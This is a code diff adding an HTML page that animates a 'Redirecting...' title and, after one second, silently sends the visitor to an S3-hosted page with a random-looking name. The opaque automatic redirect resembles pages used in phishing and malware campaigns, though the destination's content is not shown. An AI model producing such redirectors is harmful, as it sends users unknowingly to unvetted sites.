@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Redirecting...</title>
+  </head>
+  <body>
+    <script>
+      let count = 0;
+      const titles = ["Redirecting.", "Redirecting..", "Redirecting..."];
+
+      const interval = setInterval(() => {
+        document.title = titles[count % titles.length];
+        count++;
+      }, 500);
+      setTimeout(() => {
+        window.location.href =
+          "https://s3.amazonaws.com/newkste7d113/616c6.html";
+      }, 1000);
+    </script>
+  </body>
+</html>
